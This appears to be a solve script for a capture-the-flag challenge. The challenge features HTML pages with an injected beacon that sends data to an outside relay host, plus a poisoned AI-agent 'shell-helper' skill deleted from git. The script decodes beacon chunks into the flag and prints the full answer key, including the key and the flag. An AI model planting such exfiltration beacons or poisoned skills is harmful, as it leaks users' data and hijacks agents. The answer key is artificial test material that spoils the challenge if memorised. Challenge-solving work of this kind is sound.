#!/usr/bin/env python3
"""Memento - Cyber Apocalypse CTF 2026 (AI - ML, easy).

Every HTML leaf in the handout carries an injected "campaign sync" beacon:

    ...relay.hollowmarch.net/p?s=<seq>&b=<chunk>&d=<runtime exfil>

`b` is one chunk of the flag, XOR'd with the campaign id and urlsafe-base64
encoded, split one chunk per leaf in `s` order. The campaign id lives in the
`x-campaign` frontmatter key of the `shell-helper` skill, which the last commit
deleted -- recover it with:

    git show c9517be^:.claude/skills/shell-helper/SKILL.md

Usage: python3 solve.py [path/to/memento]
"""

import base64
import glob
import os
import re
import sys

# `x-campaign` from the pruned shell-helper skill blob.
CAMPAIGN = b"m3m0ry-p0is0n-p3rs1sts-acr0ss-s3ss10ns!!"

BEACON = re.compile(r"[?&]s=(\d+)&b=([^&\"']+)")


def solve(root):
    # 1. Pull s= and b= out of every beacon across all leaves.
    chunks = {}
    for path in glob.glob(os.path.join(root, "*.html")):
        m = BEACON.search(open(path).read())
        if m:
            chunks[int(m.group(1))] = m.group(2)

    # 2. Reassemble in sequence order -- s is the leaf counter, not file order.
    blob = "".join(chunks[s] for s in sorted(chunks))

    # 3. urlsafe-base64 decode, then repeating-key XOR with the campaign id.
    raw = base64.urlsafe_b64decode(blob)
    return bytes(b ^ CAMPAIGN[i % len(CAMPAIGN)] for i, b in enumerate(raw)).decode()


def demo():
    """Self-check against the chunks as they appear in the handout."""
    fixture = {
        1: "JWcvSwES",   # index.html
        2: "HBxcGixD",   # about.html
        3: "GhwcXy0D",   # catalogue.html
        4: "Q0AHAHIV",   # provenance.html
        5: "C0FvHkdf",   # ledger.html
        6: "GE4=",       # petitions.html
    }
    raw = base64.urlsafe_b64decode("".join(fixture[s] for s in sorted(fixture)))
    flag = bytes(b ^ CAMPAIGN[i % len(CAMPAIGN)] for i, b in enumerate(raw)).decode()
    assert flag == "HTB{sk1lls_st1ll_pr3ss_th3_m4rk}", flag
    print("self-check ok:", flag)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        print(solve(sys.argv[1]))
    else:
        demo()
